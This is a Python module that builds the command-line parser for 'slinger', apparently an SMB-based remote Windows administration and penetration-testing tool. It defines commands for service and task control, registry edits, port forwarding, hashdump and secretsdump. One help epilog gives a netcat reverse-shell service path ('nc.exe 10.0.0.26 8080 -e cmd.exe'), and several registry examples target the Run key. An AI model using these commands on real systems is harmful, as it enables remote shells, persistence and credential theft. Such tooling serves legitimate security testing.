import argparse
from .printlib import *
from prompt_toolkit.completion import Completer, Completion
from slingerpkg.var.config import version, program_name
from itertools import zip_longest

def extract_commands_and_args(parser):
    commands_and_args = {}

    # Loop over the actions in the parser
    for action in parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            # This is a subparser. Loop over the choices (which are the commands)
            for command, subparser in action.choices.items():
                commands_and_args[command] = {}
                # Loop over the actions in the subparser
                for sub_action in subparser._actions:
                    if isinstance(sub_action, argparse._StoreAction):
                        # This is an argument. Add it to the dictionary
                        commands_and_args[command][sub_action.dest] = "Example value"

    return commands_and_args

def force_help(parser, command):
    # Get the _SubParsersAction object
    subparsers_action = [action for action in parser._actions if isinstance(action, argparse._SubParsersAction)][0]

    # Get the subparser for the command
    command_parser = subparsers_action.choices.get(command)

    if command_parser is not None:
        # Print the help message for the command
        command_parser.print_help()
    else:
        print(f"No command named '{command}' found")

def print_all_help(parser):
    subparsers_action = [action for action in parser._actions if isinstance(action, argparse._SubParsersAction)][0]
    command_parser = subparsers_action.choices
    for command, parser in command_parser.items():
        print(f"\n======= Command: {command} =======")
        parser.print_help()


class InvalidParsing(Exception):
    pass

class CustomArgumentParser(argparse.ArgumentParser):

    def format_help(self):
        if hasattr(self, 'prog') and self.prog != program_name:
            return super().format_help()
        # Get the list of available commands
        commands = [action.choices for action in self._actions if isinstance(action, argparse._SubParsersAction)][0]

        # Sort the commands alphabetically
        sorted_commands = sorted(commands.keys())

        # Calculate the number of rows for 4 columns
        rows = -(-len(sorted_commands) // 4)  # Equivalent to math.ceil(len(sorted_commands) / 4)

        # Distribute the commands across the columns, continuing the alphabetical list in each column
        columns = [sorted_commands[i:i + rows] for i in range(0, len(sorted_commands), rows)]

        # Create the help message with 4 commands per line
        help_message = '\nAvailable commands:\n------------------------------------------\n'
        for row in zip_longest(*columns, fillvalue=''):
            # Format each command to take up 20 characters of space
            formatted_row = [f"{command:<20}" for command in row]
            help_message += '  '.join(formatted_row) + '\n'

        help_message += '\nType help <command> or <command> -h for more information on a specific command\n\n'

        return help_message
    
    def parse_args(self, args=None, namespace=None):
        args, argv = self.parse_known_args(args, namespace)
        if argv:
            msg = 'unrecognized arguments: %s'
            self.error(msg % ' '.join(argv))
        return args
    
    

    def error(self, message):
        if 'invalid choice' in message:
            print_log('Invalid command entered. Type help for a list of commands.')
            raise InvalidParsing('Invalid command entered. Type help for a list of commands.')
        #super().error(message)

def show_command_help(parser, command):
    # Get the subparser for the command
    subparser = None
    for action in parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            if command in action.choices:
                subparser = action.choices[command]
                break

    if subparser is not None:
        # Print the help message for the command
        print(subparser.format_help())
    else:
        print(f"Command '{command}' not found.")


def setup_cli_parser(slingerClient):
    parser = CustomArgumentParser(prog=program_name, description='In App Commands')
    parser.add_argument('--version', action='version', version='%(prog)s '+version, help='Show the version number and exit')

    subparsers = parser.add_subparsers(dest='command')

    # Subparser for 'use' command
    parser_use = subparsers.add_parser('use', help='Connect to a specified share', description='Connect to a specific share on the remote server', epilog='Example Usage: use sharename')
    parser_use.add_argument('share', help='Specify the share name to connect to')
    parser_use.set_defaults(func=slingerClient.connect_share)

    # Subparser for 'ls' command
    parser_ls = subparsers.add_parser('ls', help='List directory contents', description='List contents of a directory at a specified path', epilog='Example Usage: ls /path/to/directory')
    parser_ls.add_argument('path', nargs='?', default=".", help='Path to list contents, defaults to current path')
    parser_ls.add_argument('-s', '--sort', choices=['name','size','created','lastaccess','lastwrite'], default="date", help='Sort the directory contents by name, size, or date')
    parser_ls.add_argument('-sr', '--sort-reverse', action='store_true', help='Reverse the sort order', default=False)
    parser_ls.add_argument('-l', '--long', action='store_true', help='Display long format listing', default=False)
    parser_ls.set_defaults(func=slingerClient.ls)

    # Subparser for 'shares' command
    parser_shares = subparsers.add_parser('shares', help='List all available shares', aliases=['enumshares'], description='List all shares available on the remote server', epilog='Example Usage: shares')
    parser_shares.set_defaults(func=slingerClient.list_shares)

    # Subparser for 'cat' command
    parser_cat = subparsers.add_parser('cat', help='Display file contents', description='Display the contents of a specified file on the remote server', epilog='Example Usage: cat /path/to/file')
    parser_cat.add_argument('remote_path', help='Specify the remote file path to display contents')
    parser_cat.set_defaults(func=slingerClient.cat)

    # Subparser for 'cd' command
    parser_cd = subparsers.add_parser('cd', help='Change directory', description='Change to a different directory on the remote server', epilog='Example Usage: cd /path/to/directory')
    parser_cd.add_argument('path', nargs='?', default=".", help='Directory path to change to, defaults to current directory')
    parser_cd.set_defaults(func=slingerClient.cd_handler)

    # Subparser for 'pwd' command
    parser_pwd = subparsers.add_parser('pwd', help='Print working directory', description='Print the current working directory on the remote server', epilog='Example Usage: pwd')
    parser_pwd.set_defaults(func=slingerClient.print_current_path)
    # Subparser for 'exit' command
    parser_exit = subparsers.add_parser('exit', help='Exit the program', description='Exit the application', epilog='Example Usage: exit', aliases=['quit', 'logout', 'logoff'])

    # Subparser for 'help' command
    parser_help = subparsers.add_parser('help', help='Show help message', description='Display help information for the application', epilog='Example Usage: help')
    parser_help.add_argument('cmd', nargs='?', help='Specify a command to show help for')

    # Subparser for 'who' command
    parser_who = subparsers.add_parser('who', help='List current sessions.  This is different than the current user logins', description='List the current sessions connected to the target host', epilog='Example Usage: who')
    parser_who.set_defaults(func=slingerClient.who)

    # Subparser for 'enumdisk' command
    parser_diskenum = subparsers.add_parser('enumdisk', help='Enumerate server disk', description='Enumerate server disk information', epilog='Example Usage: enumdisk')
    parser_diskenum.set_defaults(func=slingerClient.enum_server_disk)

    # Subparser for 'enumlogons' command
    parser_logonsenum = subparsers.add_parser('enumlogons', help='Enumerate logged on users', description='Enumerate users currently logged on the server', epilog='Example Usage: enumlogons')
    parser_logonsenum.set_defaults(func=slingerClient.enum_logons)

    # Subparser for 'enuminfo' command
    parser_infoenum = subparsers.add_parser('enuminfo', help='Enumerate remote host information', description='Enumerate detailed information about the remote host', epilog='Example Usage: enuminfo')
    parser_infoenum.set_defaults(func=slingerClient.enum_info)

    # Subparser for 'enumsys' command
    parser_sysenum = subparsers.add_parser('enumsys', help='Enumerate remote host system information', description='Enumerate system information of the remote host', epilog='Example Usage: enumsys')
    parser_sysenum.set_defaults(func=slingerClient.enum_sys)

    # Subparser for 'enumtransport' command
    parser_transenum = subparsers.add_parser('enumtransport', help='Enumerate remote host transport information', description='Enumerate transport information of the remote host', epilog='Example Usage: enumtransport')
    parser_transenum.set_defaults(func=slingerClient.enum_transport)

    # Subparser for 'enumservices' command
    parser_svcenum = subparsers.add_parser('enumservices', help='Enumerate services', description='Enumerate services on the remote host', 
                                            epilog='Example Usage: enumservices --filter name=spooler OR enumservices --filter state=running OR enumservices -n',
                                            aliases=['servicesenum','svcenum','services'])
    parser_svcenum.add_argument('-n', '--new', action='store_true', help='Perform a new enumeration of services even if already enumerated')
    parser_svcenum.add_argument('--filter', help='Filter services by name or state')
    parser_svcenum.set_defaults(func=slingerClient.enum_services)

    # Subparser for 'serviceshow' command
    parser_svcshow = subparsers.add_parser('serviceshow', help='Show details for a service', description='Show details of a specific service on the remote server', epilog='Example Usage: serviceshow -i 123', aliases=['svcshow','showservice'])
    parser_svcshow.set_defaults(func=slingerClient.show_service_handler)
    svcshowgroup = parser_svcshow.add_mutually_exclusive_group(required=True)
    svcshowgroup.add_argument('-i', '--serviceid', type=int, help='Specify the ID of the service to show details for')
    svcshowgroup.add_argument('service_name', type=str, nargs='?', help='Specify the name of the service to show')
    
    # Subparser for 'servicestart' command
    parser_svcstart = subparsers.add_parser('servicestart', help='Start a service', description='Start a specified service on the remote server', epilog='Example Usage: servicestart -i 123  OR svcstart Spooler', aliases=['svcstart','servicestart','servicerun'])
    parser_svcstart.set_defaults(func=slingerClient.start_service_handler)
    svcstartgroup = parser_svcstart.add_mutually_exclusive_group(required=True)
    svcstartgroup.add_argument('-i', '--serviceid', type=int, help='Specify the ID of the service to start')
    svcstartgroup.add_argument('service_name', type=str, nargs='?', help='Specify the name of the service to start')

    # Subparser for 'servicestop' command
    parser_svcstop = subparsers.add_parser('servicestop', help='Stop a service', description='Stop a specified service on the remote server', epilog='Example Usage: servicestop -i 123  OR svcstop Spooler', aliases=['svcstop','servicestop'])
    parser_svcstop.set_defaults(func=slingerClient.service_stop_handler)
    svcstopgroup = parser_svcstop.add_mutually_exclusive_group(required=True)
    svcstopgroup.add_argument('-i', '--serviceid', type=int, help='Specify the ID of the service to stop')
    svcstopgroup.add_argument('service_name', type=str, nargs='?', help='Specify the name of the service to stop')

    # Subparser for 'serviceenable' command
    parser_svcenable = subparsers.add_parser('serviceenable', help='Enable a service', description='Enable a specified service on the remote server', epilog='Example Usage: serviceenable -i 123  OR svcenable Spooler', aliases=['svcenable','enableservice', 'enablesvc'])
    parser_svcenable.set_defaults(func=slingerClient.enable_service_handler)
    svcenablegroup = parser_svcenable.add_mutually_exclusive_group(required=True)
    svcenablegroup.add_argument('-i', '--serviceid', type=int, help='Specify the ID of the service to enable')
    svcenablegroup.add_argument('service_name', type=str, nargs='?', help='Specify the name of the service to enable')

    # Subparser for 'servicedisable' command
    parser_svcdisable = subparsers.add_parser('servicedisable', help='Disable a service', description='Disable a specified service on the remote server', epilog='Example Usage: servicedisable -i 123  OR svcdisable Spooler', aliases=['svcdisable','disableservice', 'disablesvc'])
    parser_svcdisable.set_defaults(func=slingerClient.disable_service_handler)
    svcdisablegroup = parser_svcdisable.add_mutually_exclusive_group(required=True)
    svcdisablegroup.add_argument('-i', '--serviceid', type=int, help='Specify the ID of the service to disable')
    svcdisablegroup.add_argument('service_name', type=str, nargs='?', help='Specify the name of the service to disable')

    # Subparser for 'servicedel' command
    parser_svcdelete = subparsers.add_parser('servicedel', help='Delete a service', description='Delete a specified service on the remote server', epilog='Example Usage: servicedelete -i 123  OR svcdelete Spooler', aliases=['svcdelete','servicedelete'])
    svcdeletegroup = parser_svcdelete.add_mutually_exclusive_group(required=True)
    svcdeletegroup.add_argument('-i', '--serviceid', type=int, help='Specify the ID of the service to delete')
    svcdeletegroup.add_argument('service_name', type=str, nargs='?', help='Specify the name of the service to delete')
    parser_svcdelete.set_defaults(func=slingerClient.service_del_handler)

    # Subparser for 'servicecreate' command
    parser_svccreate = subparsers.add_parser('serviceadd', help='Create a new service', description='Create a new service on the remote server', epilog=r'Example Usage: -b "C:\nc.exe 10.0.0.26 8080 -e cmd.exe"', aliases=['svcadd','servicecreate','svccreate'], formatter_class=argparse.RawDescriptionHelpFormatter)
    parser_svccreate.add_argument('-n', '--servicename', required=True, help='Specify the name of the new service')
    parser_svccreate.add_argument('-b', '--binarypath', required=True, help='Specify the binary path of the new service')
    parser_svccreate.add_argument('-d', '--displayname', required=True, help='Specify the display name of the new service')
    parser_svccreate.add_argument('-s', '--starttype', choices=['auto','demand','system'], default="demand", required=True, help='Specify the start type of the new service')
    parser_svccreate.set_defaults(func=slingerClient.create_service)

    # Subparser for 'enumtasks' command
    parser_taskenum = subparsers.add_parser('enumtasks', help='Enumerate scheduled tasks', description='Enumerate scheduled tasks on the remote server', epilog='Example Usage: enumtasks', aliases=['tasksenum','taskenum'])
    parser_taskenum.set_defaults(func=slingerClient.enum_task_folders_recursive)
    # Subparser for 'tasksshow' command
    parser_taskshow = subparsers.add_parser('taskshow', help='Show task details', description='Show details of a specific task on the remote server', epilog='Example Usage: tasksshow -i 123', aliases=['tasksshow','showtask'])
    taskshowgroup = parser_taskshow.add_mutually_exclusive_group(required=True)
    taskshowgroup.add_argument('-i', '--taskid', type=int, help='Specify the ID of the task to show')
    taskshowgroup.add_argument('task_path', type=str, nargs='?', help='Specify the full path of the task to show')
    #taskshowgroup.add_argument('-f', '--folder', type=str, nargs='?', help='Specify the folder to show tasks from')
    parser_taskshow.set_defaults(func=slingerClient.task_show_handler)

    # Subparser for 'taskcreate' command
    parser_taskcreate = subparsers.add_parser('taskcreate', help='Create a new task', description='Create a new scheduled task on the remote server', epilog="Example Usage: taskcreate -n newtask -p cmd.exe -a '/c ipconfig /all > C:\\test' -f \\\\Windows", aliases=['taskadd'], formatter_class=argparse.RawDescriptionHelpFormatter)
    parser_taskcreate.add_argument('-n', '--name', required=True, help='Specify the name of the new task')
    parser_taskcreate.add_argument('-p', '--program', required=True, help='Specify the program to run (cmd.exe)')
    parser_taskcreate.add_argument('-a', '--arguments', required=False, help='Specify the arguments to pass to the program')
    parser_taskcreate.add_argument('-f', '--folder', required=False, default="", help='Specify the folder to create the task in')
    parser_taskcreate.add_argument('-i', '--interval', required=False, default=None, help='Specify an interval in minutes to run the task')
    parser_taskcreate.add_argument('-d', '--date', required=False, default=None, help='Specify the date to start the task (2099-12-31 14:01:00)')
    parser_taskcreate.set_defaults(func=slingerClient.task_create)

    # Subparser for 'taskrun' command
    parser_taskrun = subparsers.add_parser('taskrun', help='Run a task', description='Run a specified task on the remote server', epilog='Example Usage: taskrun \\\\Windows\\\\newtask', aliases=['taskexec'])
    parser_taskrun.add_argument('task_path', type=str, help='Specify the full path of the task to run')
    parser_taskrun.set_defaults(func=slingerClient.task_run)

    # Subparser for 'taskdelete' command
    parser_taskdelete = subparsers.add_parser('taskdelete', help='Delete a task', description='Delete a specified task on the remote server', epilog='Example Usage: taskdelete -i 123', aliases=['taskdel','taskrm'])
    taskdeletegroup = parser_taskdelete.add_mutually_exclusive_group(required=True)
    taskdeletegroup.add_argument('task_path', type=str, nargs='?', help='Specify the full path of the task to delete')
    taskdeletegroup.add_argument('-i', '--taskid', type=int, help='Specify the ID of the task to delete')
    parser_taskdelete.set_defaults(func=slingerClient.task_delete_handler)

    # Subparser for 'enumtime' command
    parser_time = subparsers.add_parser('enumtime', help='Get server time', description='Get the current time on the server', epilog='Example Usage: enumtime')
    parser_time.set_defaults(func=slingerClient.get_server_time)

    # Subparser for 'upload' command
    parser_upload = subparsers.add_parser('upload', aliases=['put'], help='Upload a file', description='Upload a file to the remote server', epilog='Example Usage: upload /local/path /remote/path')
    parser_upload.set_defaults(func=slingerClient.upload_handler)
    parser_upload.add_argument('local_path', help='Specify the local file path to upload')
    parser_upload.add_argument('remote_path', nargs='?', help='Specify the remote file path to upload to, optional')

    # Subparser for 'download' command
    parser_download = subparsers.add_parser('download', aliases=['get'], help='Download a file', description='Download a file from the remote server', epilog='Example Usage: download /remote/path /local/path')
    parser_download.set_defaults(func=slingerClient.download_handler)
    parser_download.add_argument('remote_path', help='Specify the remote file path to download')
    parser_download.add_argument('local_path', nargs='?', help='Specify the local file path to download to, optional', default=None)

    # Subparser for 'mget' command
    parser_mget = subparsers.add_parser('mget', help='Download multiple files', description='Download all files from a specified directory and its subdirectories', epilog='Example Usage: mget /remote/path /local/path')
    parser_mget.add_argument('remote_path', nargs='?', help='Specify the remote directory path to download from')
    parser_mget.add_argument('local_path',  nargs='?', help='Specify the local directory path where files will be downloaded')
    parser_mget.add_argument('-r', action='store_true', help='Recurse into directories')
    parser_mget.add_argument('-p', metavar='regex', help='Specify a regex pattern to match filenames')
    parser_mget.add_argument('-d', type=int, default=2, help='Specify folder depth count for recursion')
    parser_mget.set_defaults(func=slingerClient.mget_handler)

    # Subparser for 'mkdir' command
    parser_mkdir = subparsers.add_parser('mkdir', help='Create a new directory', description='Create a new directory on the remote server', epilog='Example Usage: mkdir /path/to/new/directory')
    parser_mkdir.add_argument('path', help='Specify the path of the directory to create')
    parser_mkdir.set_defaults(func=slingerClient.mkdir)

    # Subparser for 'rmdir' command
    parser_rmdir = subparsers.add_parser('rmdir', help='Remove a directory', description='Remove a directory on the remote server', epilog='Example Usage: rmdir /path/to/remote/directory')
    parser_rmdir.add_argument('remote_path', help='Specify the remote path of the directory to remove')
    parser_rmdir.set_defaults(func=slingerClient.rmdir)
    # Subparser for 'rm' command
    parser_rm = subparsers.add_parser('rm', help='Delete a file', description='Delete a file on the remote server', epilog='Example Usage: rm /path/to/remote/file')
    parser_rm.add_argument('remote_path', help='Specify the remote file path to delete')
    parser_rm.set_defaults(func=slingerClient.rm_handler)

    # Subparser for '#shell' command
    parser_shell = subparsers.add_parser('#shell', help='Enter local terminal mode', description='Enter local terminal mode for command execution', epilog='Example Usage: #shell')
    # No arguments needed for shell

    # Subparser for '!' command
    parser_cmd = subparsers.add_parser('!', help='Run a local command', description='Run a specified local command', epilog='Example Usage: ! ls -l')
    parser_cmd.add_argument('commands', nargs=argparse.REMAINDER, help='Specify the local commands to run')

    # Subparser for 'info' command
    parser_info = subparsers.add_parser('info', help='Display session status', description='Display the status of the current session', epilog='Example Usage: info')
    parser_info.set_defaults(func=slingerClient.info)

    parser_regstart = subparsers.add_parser('reguse', aliases=['regstart'],help='Connect to the remote registry', description='Connect to a remote registry on the remote server', epilog='Example Usage: reguse')
    parser_regstart.set_defaults(func=slingerClient.setup_remote_registry)

    parser_regstop = subparsers.add_parser('regstop', help='Disconnect from the remote registry', description='Disconnect from a remote registry on the remote server', epilog='Example Usage: regstop')
    parser_regstop.set_defaults(func=slingerClient.stop_remote_registry)

    parser_regquery = subparsers.add_parser('regquery', help='Query a registry key', description='Query a registry key on the remote server', epilog='Example Usage: regquery HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run')
    parser_regquery.add_argument('key', help='Specify the registry key to query')
    parser_regquery.add_argument('-l', '--list', help='List all subkeys in the registry key', action='store_true')
    parser_regquery.add_argument('-v', '--value', help='Enumerate the value of the specified registry key', action='store_true')
    parser_regquery.set_defaults(func=slingerClient.reg_query_handler)

    parser_regset = subparsers.add_parser('regset', help='Set a registry value', description='Set a registry value on the remote server', epilog='Example Usage: regset -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ -v test -d "C:\\test.exe"')
    parser_regset.add_argument('-k', '--key', help='Specify the registry key to set', required=True)
    parser_regset.add_argument('-v', '--value', help='Specify the registry value to set', required=True)
    parser_regset.add_argument('-d', '--data', help='Specify the registry data to set', required=True)
    parser_regset.add_argument('-t', '--type', help='Specify the registry type to set', default="REG_SZ", required=False)
    parser_regset.set_defaults(func=slingerClient.add_reg_value_handler)

    parser_regdel = subparsers.add_parser('regdel', help='Delete a registry value', description='Delete a registry value on the remote server', epilog='Example Usage: regdel -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\ -v test')
    parser_regdel.add_argument('-k', '--key', help='Specify the registry key to delete', required=True)
    parser_regdel.add_argument('-v', '--value', help='Specify the registry value to delete', required=False)
    parser_regdel.set_defaults(func=slingerClient.reg_delete_handler)

    parser_regcreate = subparsers.add_parser('regcreate', help='Create a registry key', description='Create a registry key on the remote server', epilog='Example Usage: regcreate -k HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\test')
    parser_regcreate.add_argument('key', help='Specify the registry key to create')
    parser_regcreate.set_defaults(func=slingerClient.reg_create_key)

    parser_regcheck = subparsers.add_parser('regcheck', help='Check if a registry key exists', description='Check if a registry key exists on the remote server.  This is really just an exposed helper function.', epilog='Example Usage: regcheck HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\test')
    parser_regcheck.add_argument('key', help='Specify the registry key to check')
    parser_regcheck.set_defaults(func=slingerClient.does_key_exist)

    parser_portfwd = subparsers.add_parser('portfwd', help='Forward a local port to a remote port', description='Forward a local port to a remote port on the remote server', epilog='Example Usage: portfwd (-a|-d) [lhost]:[lport] [rhost]:[rport]')
    parser_portfwd.set_defaults(func=slingerClient.port_fwd_handler)
    parser_portfwdgroup = parser_portfwd.add_mutually_exclusive_group(required=True)
    
    parser_portfwd.add_argument('local', help='Specify the local host and port to forward from', default=None)
    parser_portfwd.add_argument('remote', help='Specify the remote host and port to forward to', default=None)

    parser_portfwdgroup.add_argument('-d', '--remove', help='Remove a port forwarding rule', action='store_true')
    parser_portfwdgroup.add_argument('-a', '--add', help='Add a port forwarding rule', action='store_true')
    parser_portfwdgroup.add_argument('-l', '--list', help='List all port forwarding rules', action='store_true')
    parser_portfwdgroup.add_argument('-c', '--clear', help='Clear all port forwarding rules', action='store_true')
    parser_portfwdgroup.add_argument('--load', help='Load all port forwarding rules from the registry', action='store_true')

    parser_ifconfig = subparsers.add_parser('ifconfig', help='Display network interfaces', aliases=["ipconfig", "enuminterfaces"], description='Display network interfaces on the remote server', epilog='Example Usage: ifconfig')
    parser_ifconfig.set_defaults(func=slingerClient.ipconfig)
    
    parser_hostname = subparsers.add_parser('hostname', help='Display hostname', description='Display the hostname of the remote server', epilog='Example Usage: hostname')
    parser_hostname.set_defaults(func=slingerClient.hostname)

    parser_procs = subparsers.add_parser('procs', help='List running processes', aliases=['ps','tasklist'], description='List running processes on the remote server', epilog='Example Usage: procs')
    parser_procs.set_defaults(func=slingerClient.show_process_list)

    parser_fwrules = subparsers.add_parser('fwrules', help='Display firewall rules', description='Display firewall rules on the remote server', epilog='Example Usage: fwrules')
    parser_fwrules.set_defaults(func=slingerClient.show_fw_rules)


    parser_setvar = subparsers.add_parser('set', help='Set a variable', description='Set a variable for use in the application', epilog='Example Usage: set varname value')
    parser_setvar.add_argument('varname', help='Set the debug variable to True or False')
    parser_setvar.add_argument('value', help='Set the mode variable to True or False')
    
    parser_setvar = subparsers.add_parser('config', help='Show the current config', description='Show the current config', epilog='Example Usage: config')
    
    parser_run = subparsers.add_parser('run', help='Run a slinger script or command sequence', description='Run a slinger script or command sequence', epilog='Example Usage: run -c|-f [script]')
    #parser_run.add_argument('-v', '--validate', help='Validate the script or command sequence without running it', action='store_true')
    parser_rungroup = parser_run.add_mutually_exclusive_group(required=True)
    parser_rungroup.add_argument('-c', '--cmd_chain', help='Specify a command sequence to run')
    parser_rungroup.add_argument('-f', '--file', help='Specify a script file to run')

    parser_hashdump = subparsers.add_parser('hashdump', help='Dump hashes from the remote server', description='Dump hashes from the remote server', epilog='Example Usage: hashdump')
    parser_hashdump.set_defaults(func=slingerClient.hashdump)

    parser_secretsdump = subparsers.add_parser('secretsdump', help='Dump secrets from the remote server', description='Dump secrets from the remote server', epilog='Example Usage: secretsdump')
    parser_secretsdump.set_defaults(func=slingerClient.secretsdump)

    parser_env = subparsers.add_parser('env', help='Display environment variables', description='Display environment variables on the remote server', epilog='Example Usage: env')
    parser_env.set_defaults(func=slingerClient.show_env_handler)

    parser_availCounters = subparsers.add_parser('debug-availcounters', help='Display available performance counters.  This is for debug use only, it doesn\'t really give you anything.', description='Display available performance counters on the remote server.  This is for debug use only, it doesn\'t really give you anything.', epilog='Example Usage: availcounters')
    parser_availCounters.add_argument('-f', '--filter', help='Simple filter for case insenstive counters containing a given string', default=None, type=str)
    parser_availCounters.add_argument('-p', '--print', help='Print the available counters to the screen.  Must be provide with -s if you want to print to screen.', action='store_true', default=False)
    parser_availCounters.add_argument('-s', '--save', help='Save the available counters to a file', default=None, type=str, required=False, metavar='filename')
    parser_availCounters.set_defaults(func=slingerClient.show_avail_counters)

    parser_getCounter = subparsers.add_parser('debug-counter', help='Display a performance counter.  This is for debug use only, it doesn\'t really give you anything.', description='Display a performance counter on the remote server.  This is for debug use only, it doesn\'t really give you anything.', epilog='Example Usage: counter -c 123 [-a x86]')
    parser_getCounter.add_argument('-c','--counter', help='Specify the counter to display', default=None, type=int)
    parser_getCounter.add_argument('-a', '--arch', help='Specify the architecture of the remote server', choices=['x86','x64', 'unk'], default='unk')
    parser_getCounter.add_argument('-i', '--interactive', help='Run the counter in interactive mode', action='store_true', default=False)

    parser_getCounter.set_defaults(func=slingerClient.show_perf_counter)

    parser_network = subparsers.add_parser('network', help='Display network information', description='Display network information on the remote server', epilog='Example Usage: network')
    parser_network.add_argument('-tcp', help='Display TCP information', action='store_true', default=False)
    parser_network.add_argument('-rdp', help='Display RDP information', action='store_true', default=False)
    parser_network.set_defaults(func=slingerClient.show_network_info_handler)

    
    parser_reload = subparsers.add_parser('reload', help='Reload the current session context (hist file location, plugins, etc)', description='Reload the current sessions context', epilog='Example Usage: reload')

    return parser

# def validate_args(parser, arg_list):
#     try:
#         args = parser.parse_args(arg_list)
#     except InvalidParsing:
#         return False
#     pass
    

def file_to_slinger_script(file_path):
    script = ""
    with open(file_path, 'r') as file:
        script = file.read().splitlines()
    return script

def get_subparser_aliases(command, parser):
    for action in parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            for name, subparser in action.choices.items():
                if command == name:
                    # Inspect the subparser to find aliases
                    for alias, alias_parser in action.choices.items():
                        if alias != name and alias_parser is subparser:
                            return [alias for alias in action.choices if alias != name and action.choices[alias] is subparser]
    return []

# Custom Completer class using argparse commands and arguments

def setup_completer(subparsers):
    commands = {}
    for action in subparsers._actions:
        if isinstance(action, argparse._SubParsersAction):
            for cmd, subparser in action.choices.items():
                commands[cmd] = [arg for arg in subparser._option_string_actions.keys()]
    return commands


class CommandCompleter(Completer):
    def __init__(self, commands):
        self.commands = commands

    def get_completions(self, document, complete_event):
        text_before_cursor = document.text_before_cursor.strip()
        words = text_before_cursor.split(' ')
        first_word = words[0]

        # If typing the first word, suggest command names
        if len(words) == 1:
            for command in self.commands.keys():
                if command.startswith(first_word):
                    yield Completion(command, start_position=-len(first_word))
            return

        # If typing subsequent words, suggest flags for the last command
        if first_word in self.commands:
            for flag in self.commands[first_word]:
                if flag.startswith(words[-1]):
                    yield Completion(flag, start_position=-len(words[-1]))

def get_prompt(client, nojoy):
    slinger_emoji = '\U0001F920'
    fire_emoji = "\U0001F525"
    neutral_face_unicode = "\U0001F610"

    if client.is_connected_to_remote_share():
        preamble = slinger_emoji + fire_emoji  + " "
        emoji = preamble if not nojoy else ""
    else:
        preamble = slinger_emoji + " "
        emoji = preamble if not nojoy else ""
    
    prompt = f"{emoji}{colors.OKGREEN}({client.host}):\\\\{client.current_path}>{colors.ENDC} "
    return prompt


def merge_parsers(primary_parser, secondary_parser):
    # Transfer arguments
    for action in secondary_parser._actions:
        if not any(a for a in primary_parser._actions if a.dest == action.dest):
            primary_parser._add_action(action)

    # Check if both parsers have subparsers
    primary_subparsers = None
    secondary_subparsers = None

    for action in primary_parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            primary_subparsers = action
            break

    for action in secondary_parser._actions:
        if isinstance(action, argparse._SubParsersAction):
            secondary_subparsers = action
            break

    # If both have subparsers, merge them
    if primary_subparsers and secondary_subparsers:
        for choice, subparser in secondary_subparsers.choices.items():
            primary_subparsers.add_parser(choice, parents=[subparser], add_help=False)

    return primary_parser

# Example usage:
# merged_parser = merge_parsers(parser1, parser2)
